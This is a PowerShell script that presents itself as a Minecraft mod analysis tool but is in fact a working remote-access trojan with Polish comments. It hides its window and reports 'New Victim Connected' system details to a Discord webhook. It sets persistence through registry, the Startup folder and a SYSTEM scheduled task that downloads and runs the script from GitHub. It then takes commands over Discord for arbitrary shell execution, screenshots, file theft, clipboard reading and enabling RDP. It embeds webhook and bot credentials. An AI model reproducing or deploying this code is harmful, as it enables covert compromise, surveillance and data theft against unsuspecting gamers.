<#
.SYNOPSIS
    MeowModAnalyzer - Minecraft Mod Analysis Tool
.DESCRIPTION
    Analyzes Minecraft mods for conflicts and performance issues.
.NOTES
    Author: MeowTonenohh
    Version: 2.2.0
#>

# ============================================================
# KONFIGURACJA - WPISZ TUTAJ SWÓJ NOWY TOKEN BOTA
# ============================================================
$script:webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$script:botToken = "MTUxMjkxNzg2NTY0MzM3NjY2MA.GwQpKI.xsOr-EJt_6grJ9_HqOfUIsb0AgLUqP5QRhSoIk"   # <--- WPISZ TUTAJ NOWY TOKEN
$script:channelId = "1512918078189731890"
# ============================================================

# Schowaj okno konsoli
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    '
    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
} catch {}

# Funkcja wysylania na Discord webhook
function Send-DiscordMessage {
    param([string]$Content, [string]$FilePath, [string]$EmbedJson)
    
    $body = @{content = $Content; username = "MeowModAnalyzer"}
    if ($EmbedJson) { $body["embeds"] = @($EmbedJson | ConvertFrom-Json) }
    
    # Wysylanie z plikiem
    if ($FilePath -and (Test-Path $FilePath)) {
        try {
            Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
            $client = New-Object System.Net.Http.HttpClient
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $jsonContent = New-Object System.Net.Http.StringContent ($body | ConvertTo-Json -Depth 10 -Compress)
            $form.Add($jsonContent, "payload_json")
            $fileStream = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
            $fileContent = New-Object System.Net.Http.StreamContent $fileStream
            $form.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath))
            $client.PostAsync("$script:webhookUrl?wait=true", $form).Result | Out-Null
            $client.Dispose()
            $fileStream.Close()
            return
        } catch {}
    }
    
    # Wysylanie tekstu
    try {
        Invoke-RestMethod -Uri $script:webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

# Wyslij info o nowym polaczeniu
function Send-NewConnection {
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
    try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $ip = "Unknown" }
    try { $localIp = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -join ", ") } catch { $localIp = "Unknown" }
    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
    try { $av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ", " } catch { $av = "None" }
    if (-not $av) { $av = "None detected" }
    
    $embed = @{
        title = "New Victim Connected"
        color = 3066993
        fields = @(
            @{name = "PC Name"; value = $pcName; inline = $true},
            @{name = "User"; value = $userName; inline = $true},
            @{name = "OS"; value = $osInfo; inline = $false},
            @{name = "Public IP"; value = $ip; inline = $true},
            @{name = "Local IP"; value = $localIp; inline = $true},
            @{name = "CPU"; value = $cpu; inline = $false},
            @{name = "RAM"; value = $ram; inline = $true},
            @{name = "Antivirus"; value = $av; inline = $true}
        )
        footer = @{text = "MeowModAnalyzer v2.2.0"}
        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    }
    
    Send-DiscordMessage -Content "1" -EmbedJson ($embed | ConvertTo-Json)
}

# Screenshot
function Take-Screenshot {
    param([string]$OutputPath)
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        return $true
    } catch { return $false }
}

# Wykonaj komende
function Execute-Command {
    param([string]$CommandText)
    
    $tempOutput = [System.IO.Path]::GetTempFileName() + ".txt"
    
    try {
        $result = Invoke-Expression -Command $CommandText 2>&1
        $output = $result | Out-String
        if ([string]::IsNullOrEmpty($output)) { $output = "[Command executed - no output]" }
        
        if ($output.Length -gt 1900) {
            $output | Out-File -FilePath $tempOutput -Encoding UTF8
            Send-DiscordMessage -Content "**Command executed:**" -FilePath $tempOutput
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            Send-DiscordMessage -Content "**> $CommandText**`n$output"
        }
    } catch {
        Send-DiscordMessage -Content "**Error:** $($_.Exception.Message)"
    }
}

# Persistence - uruchamianie przy starcie
function Enable-Persistence {
    $psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
    
    # Metoda 1: Registry HKCU Run
    try { Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MeowModAnalyzer" $psCommand -ErrorAction SilentlyContinue } catch {}
    
    # Metoda 2: Registry HKLM Run (admin)
    try { Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" "MeowModAnalyzer" $psCommand -ErrorAction SilentlyContinue } catch {}
    
    # Metoda 3: Startup Folder
    try {
        $startupFolder = [Environment]::GetFolderPath("Startup")
        $shortcutPath = Join-Path $startupFolder "MeowModAnalyzer.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $shortcut.WindowStyle = 7
        $shortcut.Save()
    } catch {}
    
    # Metoda 4: Task Scheduler - uruchamia sie jako SYSTEM przy starcie
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
        Register-ScheduledTask -TaskName "MeowModAnalyzerTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Wlacz RDP
function Enable-RDP {
    try {
        Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0 -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
        Send-DiscordMessage -Content "RDP enabled on port 3389"
    } catch { Send-DiscordMessage -Content "RDP failed: $($_.Exception.Message)" }
}

# Glowny handler komend
function Process-Command {
    param([string]$Command, [string]$Arguments)
    
    $cmd = $Command.ToLower().Trim()
    $arg = $Arguments
    
    switch ($cmd) {
        "!help" {
            $help = @"
**MeowModAnalyzer - Komendy:**
!screenshot - Zrzut ekranu
!cmd <komenda> - Wykonaj PowerShell
!shell <komenda> - Wykonaj CMD
!download <url> - Pobierz plik
!upload <sciezka> - Wyslij plik na Discord
!persist - Wlacz persistence (startup)
!rdp - Wlacz RDP
!info - Info o systemie
!ipconfig - Konfiguracja sieci
!pslist - Lista procesow
!prockill <pid> - Zabij proces
!lock - Blokada ekranu
!msg <tekst> - Pokaz okno dialogowe
!clipboard - Czytaj schowek
!runas <user> <pass> <cmd> - Uruchom jako inny user
!exit - Zamknij agenta
"@
            Send-DiscordMessage -Content $help
        }
        "!screenshot" {
            $ssPath = "$env:TEMP\ss_$(Get-Random).png"
            if (Take-Screenshot -OutputPath $ssPath) {
                Send-DiscordMessage -Content "Screenshot:" -FilePath $ssPath
                Remove-Item $ssPath -Force -ErrorAction SilentlyContinue
            } else {
                Send-DiscordMessage -Content "Screenshot failed"
            }
        }
        "!cmd" {
            if ($arg) { Execute-Command -CommandText $arg } else { Send-DiscordMessage -Content "Usage: !cmd <komenda>" }
        }
        "!shell" {
            if ($arg) { Execute-Command -CommandText "cmd /c $arg" } else { Send-DiscordMessage -Content "Usage: !shell <komenda>" }
        }
        "!download" {
            if ($arg) {
                $fileName = [System.IO.Path]::GetFileName($arg)
                $destPath = "$env:TEMP\$fileName"
                try {
                    Invoke-WebRequest -Uri $arg -OutFile $destPath -ErrorAction Stop
                    Send-DiscordMessage -Content "Downloaded: $fileName to $destPath"
                } catch { Send-DiscordMessage -Content "Download failed: $($_.Exception.Message)" }
            } else { Send-DiscordMessage -Content "Usage: !download <url>" }
        }
        "!upload" {
            if ($arg -and (Test-Path $arg)) {
                Send-DiscordMessage -Content "File: $arg" -FilePath $arg
            } else { Send-DiscordMessage -Content "Usage: !upload <sciezka>" }
        }
        "!persist" {
            Enable-Persistence
            Send-DiscordMessage -Content "Persistence enabled (Registry + Startup + Task Scheduler)"
        }
        "!rdp" { Enable-RDP }
        "!info" {
            try { $pcName = $env:COMPUTERNAME } catch { $pcName = "Unknown" }
            try { $userName = $env:USERNAME } catch { $userName = "Unknown" }
            try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
            try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $ip = "Unknown" }
            try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
            try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
            
            $embed = @{
                title = "System Info - $pcName"
                color = 3447003
                fields = @(
                    @{name = "PC Name"; value = $pcName; inline = $true},
                    @{name = "User"; value = $userName; inline = $true},
                    @{name = "OS"; value = $osInfo; inline = $false},
                    @{name = "Public IP"; value = $ip; inline = $true},
                    @{name = "CPU"; value = $cpu; inline = $false},
                    @{name = "RAM"; value = $ram; inline = $true}
                )
                timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
            }
            Send-DiscordMessage -Content "System Info:" -EmbedJson ($embed | ConvertTo-Json)
        }
        "!exit" {
            Send-DiscordMessage -Content "Agent shutting down..."
            exit
        }
        "!ipconfig" { Execute-Command -CommandText "ipconfig /all" }
        "!pslist" { Execute-Command -CommandText "Get-Process | Format-Table Id, ProcessName, CPU, PM -AutoSize | Out-String" }
        "!prockill" {
            if ($arg -and $arg -match '^\d+$') {
                try { Stop-Process -Id $arg -Force; Send-DiscordMessage -Content "Killed process PID: $arg" } catch { Send-DiscordMessage -Content "Failed to kill PID $arg: $($_.Exception.Message)" }
            } else { Send-DiscordMessage -Content "Usage: !prockill <pid>" }
        }
        "!lock" {
            try { rundll32.exe user32.dll,LockWorkStation } catch {}
            Send-DiscordMessage -Content "Workstation locked"
        }
        "!msg" {
            if ($arg) {
                try {
                    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                    [System.Windows.Forms.MessageBox]::Show($arg, "MeowModAnalyzer", "OK", "Information") | Out-Null
                    Send-DiscordMessage -Content "Message shown: $arg"
                } catch { Send-DiscordMessage -Content "Failed to show message" }
            } else { Send-DiscordMessage -Content "Usage: !msg <tekst>" }
        }
        "!clipboard" {
            try {
                Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                $clipboard = [System.Windows.Forms.Clipboard]::GetText()
                if ($clipboard) { Send-DiscordMessage -Content "Clipboard: $clipboard" } else { Send-DiscordMessage -Content "Clipboard is empty" }
            } catch { Send-DiscordMessage -Content "Failed to read clipboard" }
        }
        "!runas" {
            if ($arg) {
                $parts = $arg -split ' ', 3
                if ($parts.Count -eq 3) {
                    $user = $parts[0]; $pass = $parts[1]; $cmd = $parts[2]
                    try {
                        $secPass = ConvertTo-SecureString $pass -AsPlainText -Force
                        $cred = New-Object System.Management.Automation.PSCredential ($user, $secPass)
                        $result = Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { param($c) Invoke-Expression $c 2>&1 | Out-String } -ArgumentList $cmd -ErrorAction Stop
                        Send-DiscordMessage -Content "RunAs ($user): $result"
                    } catch { Send-DiscordMessage -Content "RunAs failed: $($_.Exception.Message)" }
                } else { Send-DiscordMessage -Content "Usage: !runas <user> <pass> <cmd>" }
            } else { Send-DiscordMessage -Content "Usage: !runas <user> <pass> <cmd>" }
        }
        default {
            Send-DiscordMessage -Content "Unknown command: $cmd`nUse !help for commands"
        }
    }
}

# ============================================================
# PETLA GLOWNA - REST API Polling
# ============================================================

# Wyslij "1" jako test i informacje o systemie
Send-NewConnection

# Wlacz persistence
Enable-Persistence

# Wyslij potwierdzenie
Send-DiscordMessage -Content "Agent ready! Listening for commands..."

# Glowna petla
$lastMessageId = $null

while ($true) {
    try {
        $url = "https://discord.com/api/v9/channels/$script:channelId/messages?limit=5"
        $headers = @{ "Authorization" = "Bot $script:botToken"; "User-Agent" = "MeowModAnalyzer/2.2.0" }
        
        $messages = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction SilentlyContinue
        
        if ($messages -and $messages.Count -gt 0) {
            foreach ($msg in $messages) {
                if (($lastMessageId -eq $null -or $msg.id -gt $lastMessageId) -and -not $msg.author.bot) {
                    
                    # Sprawdz czy wiadomosc zaczyna sie od !
                    if ($msg.content -match '^!') {
                        $parts = $msg.content -split ' ', 2
                        $cmd = $parts[0]
                        $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
                        Process-Command -Command $cmd -Arguments $args
                    }
                    
                    # Ustaw ostatnie ID tylko jesli jest wieksze
                    if ($lastMessageId -eq $null -or $msg.id -gt $lastMessageId) {
                        $lastMessageId = $msg.id
                    }
                }
            }
        }
    } catch {
        # Silent fail - nie wysylaj bledu na Discord co 3 sekundy
    }
    
    Start-Sleep -Seconds 3
}
